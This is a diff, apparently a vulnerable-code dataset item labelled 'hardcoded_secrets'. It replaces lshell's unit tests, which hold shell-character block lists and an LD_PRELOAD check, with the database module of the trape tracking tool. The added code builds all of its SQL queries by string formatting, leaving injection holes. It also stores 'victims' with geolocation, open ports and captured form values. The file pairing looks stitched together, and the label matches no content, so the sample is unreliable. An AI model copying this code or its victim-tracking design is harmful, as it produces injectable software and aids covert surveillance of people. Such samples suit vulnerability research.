@@ -2,452 +2,204 @@
 # Safety: vulnerable
 # Category: hardcoded_secrets
 
-import unittest
+#!/usr/bin/env python
 
-import os
+# -*- coding: utf-8 -*-
 
-from getpass import getuser
+#**
 
+#
 
+#########
 
-# import lshell specifics
+# trape #
 
-from lshell.shellcmd import ShellCmd
+#########
 
-from lshell.checkconfig import CheckConfig
+#
 
-from lshell.utils import get_aliases, updateprompt
+# trape depends of this file
 
-from lshell.variables import builtins_list
+# For full copyright information this visit: https://github.com/boxug/trape
 
-from lshell import builtins
+#
 
-from lshell import sec
+# Copyright 2017 by boxug / <hey@boxug.com>
 
+#**
 
+import sqlite3
 
-TOPDIR = '%s/../' % os.path.dirname(os.path.realpath(__file__))
 
 
+class Database(object):
 
+    def __init__(self):     
 
+        self.conn = sqlite3.connect("database.db", check_same_thread=False)
 
-class TestFunctions(unittest.TestCase):
+        self.cursor = self.conn.cursor()
 
-    args = ['--config=%s/etc/lshell.conf' % TOPDIR, "--quiet=1"]
+        
 
-    userconf = CheckConfig(args).returnconf()
+    def loadDatabase(self):
 
-    shell = ShellCmd(userconf, args)
+        self.cursor.execute("""CREATE TABLE IF NOT EXISTS "geo" ( `id` TEXT, `city` TEXT, `country_code` TEXT, `country_name` TEXT, `ip` TEXT, `latitude` TEXT, `longitude` TEXT, `metro_code` TEXT, `region_code` TEXT, `region_name` TEXT, `time_zone` TEXT, `zip_code` TEXT, `isp` TEXT, `ua` TEXT, PRIMARY KEY(`id`) )""")
 
+        self.cursor.execute("""CREATE TABLE IF NOT EXISTS "networks" ( `id` TEXT, `ip` TEXT, `public_ip` INTEGER, `network` TEXT, `date` TEXT )""")
 
+        self.cursor.execute("""CREATE TABLE IF NOT EXISTS "requests" ( `id` TEXT, `user_id` TEXT, `site` TEXT, `fid` TEXT, `name` TEXT, `value` TEXT, `date` TEXT )""")
 
-    def test_01_checksecure_doublequote(self):
+        self.cursor.execute("""CREATE TABLE IF NOT EXISTS "victims" ( `id` TEXT, `ip` TEXT, `date` TEXT, `time` REAL, `bVersion` TEXT, `browser` TEXT, `device` TEXT, `cpu` TEXT, `ports` TEXT, `status`  TEXT )""")
 
-        """ U01 | quoted text should not be forbidden """
+        self.cursor.execute("""CREATE TABLE IF NOT EXISTS "clicks" ( `id` TEXT, `site` TEXT, `date` TEXT )""")
 
-        INPUT = 'ls -E "1|2" tmp/test'
+        self.conn.commit()
 
-        return self.assertEqual(sec.check_secure(INPUT, self.userconf)[0], 0)
+        return True
 
 
 
-    def test_02_checksecure_simplequote(self):
+    def sql_execute(self, sentence):
 
-        """ U02 | quoted text should not be forbidden """
+        self.cursor.execute(sentence)
 
-        INPUT = "ls -E '1|2' tmp/test"
+        return self.cursor.fetchall()
 
-        return self.assertEqual(sec.check_secure(INPUT, self.userconf)[0], 0)
 
 
+    def sql_one_row(self, sentence, column):
 
-    def test_03_checksecure_doublepipe(self):
+        self.cursor.execute(sentence)
 
-        """ U03 | double pipes should be allowed, even if pipe is forbidden """
+        return self.cursor.fetchone()[column]
 
-        args = self.args + ["--forbidden=['|']"]
 
-        userconf = CheckConfig(args).returnconf()
 
-        INPUT = "ls || ls"
+    def sql_insert(self, sentence):
 
-        return self.assertEqual(sec.check_secure(INPUT, userconf)[0], 0)
+        self.cursor.execute(sentence)
 
+        self.conn.commit()
 
+        return True
 
-    def test_04_checksecure_forbiddenpipe(self):
 
-        """ U04 | forbid pipe, should return 1 """
 
-        args = self.args + ["--forbidden=['|']"]
+    def prop_sentences_stats(self, type, vId = None):
 
-        userconf = CheckConfig(args).returnconf()
+        return {
 
-        INPUT = "ls | ls"
+            'get_data' : "SELECT victims.*, geo.*, victims.ip AS ip_local, COUNT(clicks.id) FROM victims INNER JOIN geo ON victims.id = geo.id LEFT JOIN clicks ON clicks.id = victims.id GROUP BY victims.id ORDER BY victims.time DESC",
 
-        return self.assertEqual(sec.check_secure(INPUT, userconf)[0], 1)
+            'all_networks' : "SELECT networks.* FROM networks ORDER BY id",
 
+            'get_preview' : "SELECT victims.*, geo.*, victims.ip AS ip_local FROM victims INNER JOIN geo ON victims.id = geo.id WHERE victims.id = '%s'" % (vId),
 
+            'id_networks' : "SELECT networks.* FROM networks WHERE id = '%s'" % (vId),
 
-    def test_05_checksecure_forbiddenchar(self):
+            'get_requests' : "SELECT requests.*, geo.ip FROM requests INNER JOIN geo on geo.id = requests.user_id ORDER BY requests.date DESC, requests.id ",
 
-        """ U05 | forbid character, should return 1 """
+            'get_sessions' : "SELECT COUNT(*) AS Total FROM networks",
 
-        args = self.args + ["--forbidden=['l']"]
+            'get_clicks' : "SELECT COUNT(*) AS Total FROM clicks",
 
-        userconf = CheckConfig(args).returnconf()
+            'get_online' : "SELECT COUNT(*) AS Total FROM victims WHERE status = '%s'" % ('online')
 
-        INPUT = "ls"
+        }.get(type, False)
 
-        return self.assertEqual(sec.check_secure(INPUT, userconf)[0], 1)
 
 
+    def sentences_stats(self, type, vId = None):
 
-    def test_06_checksecure_sudo_command(self):
+        return self.sql_execute(self.prop_sentences_stats(type, vId))
 
-        """ U06 | quoted text should not be forbidden """
 
-        INPUT = "sudo ls"
 
-        return self.assertEqual(sec.check_secure(INPUT, self.userconf)[0], 1)
+    def prop_sentences_victim(self, type, data = None):
 
+        if type == 'count_victim':
 
+            return "SELECT COUNT(*) AS C FROM victims WHERE id = '%s'" % (data)
 
-    def test_07_checksecure_notallowed_command(self):
+        elif type == 'count_times':
 
-        """ U07 | forbidden command, should return 1 """
+            return "SELECT COUNT(*) AS C FROM clicks WHERE id = '%s'" % (data)
 
-        args = self.args + ["--allowed=['ls']"]
+        elif type == 'update_victim':
 
-        userconf = CheckConfig(args).returnconf()
+            return "UPDATE victims SET ip = '%s', date = '%s', bVersion = '%s', browser = '%s', device = '%s', ports = '%s', time = '%s', cpu = '%s', status = '%s' WHERE id = '%s'" % (data[0].ip, data[0].date, data[0].version, data[0].browser, data[0].device, data[0].ports, data[2], data[0].cpu, 'online', data[1])
 
-        INPUT = "ll"
+        elif type == 'update_victim_geo':
 
-        return self.assertEqual(sec.check_secure(INPUT, userconf)[0], 1)
+            return "UPDATE geo SET city = '%s', country_code = '%s', country_name = '%s', ip = '%s', latitude = '%s', longitude = '%s', metro_code = '%s', region_code = '%s', region_name = '%s', time_zone = '%s', zip_code = '%s', isp = '%s', ua='%s' WHERE id = '%s'" % (data[0].city, data[0].country_code, data[0].country_name, data[0].ip, data[0].latitude, data[0].longitude, data[0].metro_code, data[0].region_code, data[0].region_name, data[0].time_zone, data[0].zip_code, data[0].isp, data[0].ua, data[1])
 
+        elif type == 'insert_victim':
 
+            return "INSERT INTO victims(id, ip, date, bVersion, browser, device, ports, time, cpu, status) VALUES('%s','%s', '%s','%s', '%s','%s', '%s', '%s', '%s', '%s')" % (data[1], data[0].ip, data[0].date, data[0].version, data[0].browser, data[0].device, data[0].ports, data[2], data[0].cpu, 'online')
 
-    def test_08_checkpath_notallowed_path(self):
+        elif type == 'insert_victim_geo':
 
-        """ U08 | forbidden command, should return 1 """
+            return "INSERT INTO geo(id, city, country_code, country_name, ip, latitude, longitude, metro_code, region_code, region_name, time_zone, zip_code, isp, ua) VALUES('%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s')"  % (data[1], data[0].city, data[0].country_code, data[0].country_name, data[0].ip, data[0].latitude, data[0].longitude, data[0].metro_code, data[0].region_code, data[0].region_name, data[0].time_zone, data[0].zip_code, data[0].isp, data[0].ua)
 
-        args = self.args + ["--path=['/home', '/var']"]
+        elif type == 'count_victim_network':
 
-        userconf = CheckConfig(args).returnconf()
+            return "SELECT COUNT(*) AS C FROM networks WHERE id = '%s' AND network = '%s'" % (data[0], data[1])
 
-        INPUT = "cd /tmp"
+        elif type == 'delete_networks':
 
-        return self.assertEqual(sec.check_path(INPUT, userconf)[0], 1)
+            return "DELETE FROM networks WHERE id = '%s'" % (data[0])
 
+        elif type == 'update_network':
 
+            return "UPDATE networks SET date = '%s' WHERE id = '%s' AND network = '%s'" % (data[2], data[0], data[1])
 
-    def test_09_checkpath_notallowed_path_completion(self):
+        elif type == 'insert_networks':
 
-        """ U09 | forbidden command, should return 1 """
+            return "INSERT INTO networks(id, public_ip, ip, network, date) VALUES('%s','%s', '%s', '%s','%s')" % (data[0], data[1], data[2], data[3], data[4])
 
-        args = self.args + ["--path=['/home', '/var']"]
+        elif type == 'insert_requests':
 
-        userconf = CheckConfig(args).returnconf()
+            return "INSERT INTO requests(id, user_id, site, fid, name, value, date) VALUES('%s', '%s','%s', '%s', '%s','%s', '%s')" % (data[0].sId, data[0].id, data[0].site, data[0].fid, data[0].name, data[0].value, data[1])
 
-        INPUT = "cd /tmp/"
+        elif type == 'insert_click':
 
-        return self.assertEqual(sec.check_path(INPUT,
+            return "INSERT INTO clicks(id, site, date) VALUES('%s', '%s','%s')" % (data[0], data[1], data[2])
 
-                                               userconf,
+        elif type == 'report_online':
 
-                                               completion=1)[0], 1)
+            return "UPDATE victims SET status = '%s' WHERE id = '%s'" % ('online', data[0])
 
+        elif type == 'clean_online':
 
+            return "UPDATE victims SET status = '%s' " % ('offline')
 
-    def test_10_checkpath_dollarparenthesis(self):
+        elif type == 'disconnect_victim':
 
-        """ U10 | when $() is allowed, return 0 if path allowed """
+            return "UPDATE victims SET status = '%s' WHERE id = '%s'" % ('offline', data)
 
-        args = self.args + ["--forbidden=[';', '&', '|','`','>','<', '${']"]
+        else:
 
-        userconf = CheckConfig(args).returnconf()
+            return False
 
-        INPUT = "echo $(echo aze)"
 
-        return self.assertEqual(sec.check_path(INPUT, userconf)[0], 0)
 
+    def sentences_victim(self, type, data = None, sRun = 1, column = 0):
 
+        if sRun == 2:
 
-    def test_11_checkconfig_configoverwrite(self):
+            return self.sql_insert(self.prop_sentences_victim(type, data))
 
-        """ U12 | forbid ';', then check_secure should return 1 """
+        elif sRun == 3:
 
-        args = ['--config=%s/etc/lshell.conf' % TOPDIR, '--strict=123']
+            return self.sql_one_row(self.prop_sentences_victim(type, data), column)
 
-        userconf = CheckConfig(args).returnconf()
+        else:
 
-        return self.assertEqual(userconf['strict'], 123)
+            return self.sql_execute(self.prop_sentences_victim(type, data))
 
 
 
-    def test_12_overssh(self):
+    def __del__(self):
 
-        """ U12 | command over ssh """
-
-        args = self.args + ["--overssh=['exit']", '-c exit']
-
-        os.environ['SSH_CLIENT'] = '8.8.8.8 36000 22'
-
-        if 'SSH_TTY' in os.environ:
-
-            os.environ.pop('SSH_TTY')
-
-        with self.assertRaises(SystemExit) as cm:
-
-            CheckConfig(args).returnconf()
-
-        return self.assertEqual(cm.exception.code, 0)
-
-
-
-    def test_13_multiple_aliases_with_separator(self):
-
-        """ U13 | multiple aliases using &&, || and ; separators """
-
-        # enable &, | and ; characters
-
-        aliases = {'foo': 'foo -l', 'bar': 'open'}
-
-        INPUT = "foo; fooo  ;bar&&foo  &&   foo | bar||bar   ||     foo"
-
-        return self.assertEqual(get_aliases(INPUT, aliases),
-
-                                ' foo -l; fooo  ; open&& foo -l  '
-
-                                '&& foo -l | open|| open   || foo -l')
-
-
-
-    def test_14_sudo_all_commands_expansion(self):
-
-        """ U14 | sudo_commands set to 'all' is equal to allowed variable """
-
-        args = self.args + ["--sudo_commands=all"]
-
-        userconf = CheckConfig(args).returnconf()
-
-        # exclude internal and sudo(8) commands
-
-        exclude = builtins_list + ['sudo']
-
-        allowed = [x for x in userconf['allowed'] if x not in exclude]
-
-        # sort lists to compare
-
-        userconf['sudo_commands'].sort()
-
-        allowed.sort()
-
-        return self.assertEqual(allowed, userconf['sudo_commands'])
-
-
-
-    def test_15_allowed_ld_preload_cmd(self):
-
-        """ U15 | all allowed commands should be prepended with LD_PRELOAD """
-
-        args = self.args + ["--allowed=['echo','export']"]
-
-        userconf = CheckConfig(args).returnconf()
-
-        # sort lists to compare
-
-        return self.assertEqual(userconf['aliases']['echo'],
-
-                                'LD_PRELOAD=%s echo' % userconf['path_noexec'])
-
-
-
-    def test_16_allowed_ld_preload_builtin(self):
-
-        """ U16 | builtin commands should NOT be prepended with LD_PRELOAD """
-
-        args = self.args + ["--allowed=['echo','export']"]
-
-        userconf = CheckConfig(args).returnconf()
-
-        # verify that export is not automatically added to the aliases (i.e.
-
-        # prepended with LD_PRELOAD)
-
-        return self.assertNotIn('export', userconf['aliases'])
-
-
-
-    def test_17_allowed_exec_cmd(self):
-
-        """ U17 | allowed_shell_escape should NOT be prepended with LD_PRELOAD
-
-            The command should not be added to the aliases variable
-
-        """
-
-        args = self.args + ["--allowed_shell_escape=['echo']"]
-
-        userconf = CheckConfig(args).returnconf()
-
-        # sort lists to compare
-
-        return self.assertNotIn('echo', userconf['aliases'])
-
-
-
-    def test_18_forbidden_environment(self):
-
-        """ U18 | unsafe environment are forbidden
-
-        """
-
-        INPUT = 'export LD_PRELOAD=/lib64/ld-2.21.so'
-
-        args = INPUT
-
-        retcode = builtins.export(args)[0]
-
-        return self.assertEqual(retcode, 1)
-
-
-
-    def test_19_allowed_environment(self):
-
-        """ U19 | other environment are accepted
-
-        """
-
-        INPUT = 'export MY_PROJECT_VERSION=43'
-
-        args = INPUT
-
-        retcode = builtins.export(args)[0]
-
-        return self.assertEqual(retcode, 0)
-
-
-
-    def test_20_winscp_allowed_commands(self):
-
-        """ U20 | when winscp is enabled, new allowed commands are automatically
-
-            added (see man).
-
-        """
-
-        args = self.args + ["--allowed=[]", "--winscp=1"]
-
-        userconf = CheckConfig(args).returnconf()
-
-        # sort lists to compare, except 'export'
-
-        exclude = list(set(builtins_list) - set(['export']))
-
-        expected = exclude + ['scp', 'env', 'pwd', 'groups',
-
-                              'unset', 'unalias']
-
-        expected.sort()
-
-        allowed = userconf['allowed']
-
-        allowed.sort()
-
-        return self.assertEqual(allowed, expected)
-
-
-
-    def test_21_winscp_allowed_semicolon(self):
-
-        """ U21 | when winscp is enabled, use of semicolon is allowed """
-
-        args = self.args + ["--forbidden=[';']", "--winscp=1"]
-
-        userconf = CheckConfig(args).returnconf()
-
-        # sort lists to compare
-
-        return self.assertNotIn(';', userconf['forbidden'])
-
-
-
-    def test_22_prompt_short_0(self):
-
-        """ U22 | short_prompt = 0 should show dir compared to home dir """
-
-        expected = '%s:~/foo$ ' % getuser()
-
-        args = self.args + ['--prompt_short=0']
-
-        userconf = CheckConfig(args).returnconf()
-
-        currentpath = "%s/foo" % userconf['home_path']
-
-        prompt = updateprompt(currentpath, userconf)
-
-        # sort lists to compare
-
-        return self.assertEqual(prompt, expected)
-
-
-
-    def test_23_prompt_short_1(self):
-
-        """ U23 | short_prompt = 1 should show only current dir """
-
-        expected = '%s: foo$ ' % getuser()
-
-        args = self.args + ['--prompt_short=1']
-
-        userconf = CheckConfig(args).returnconf()
-
-        currentpath = "%s/foo" % userconf['home_path']
-
-        prompt = updateprompt(currentpath, userconf)
-
-        # sort lists to compare
-
-        return self.assertEqual(prompt, expected)
-
-
-
-    def test_24_prompt_short_2(self):
-
-        """ U24 | short_prompt = 2 should show full dir path """
-
-        expected = '%s: %s$ ' % (getuser(), os.getcwd())
-
-        args = self.args + ['--prompt_short=2']
-
-        userconf = CheckConfig(args).returnconf()
-
-        currentpath = "%s/foo" % userconf['home_path']
-
-        prompt = updateprompt(currentpath, userconf)
-
-        # sort lists to compare
-
-        return self.assertEqual(prompt, expected)
-
-
-
-    def test_25_disable_ld_preload(self):
-
-        """ U25 | empty path_noexec should disable LD_PRELOAD """
-
-        args = self.args + ["--allowed=['echo','export']", "--path_noexec=''"]
-
-        userconf = CheckConfig(args).returnconf()
-
-        # verify that no alias was created containing LD_PRELOAD
-
-        return self.assertNotIn('echo', userconf['aliases'])
-
-
-
-if __name__ == "__main__":
-
-    unittest.main()
+        self.conn.close()
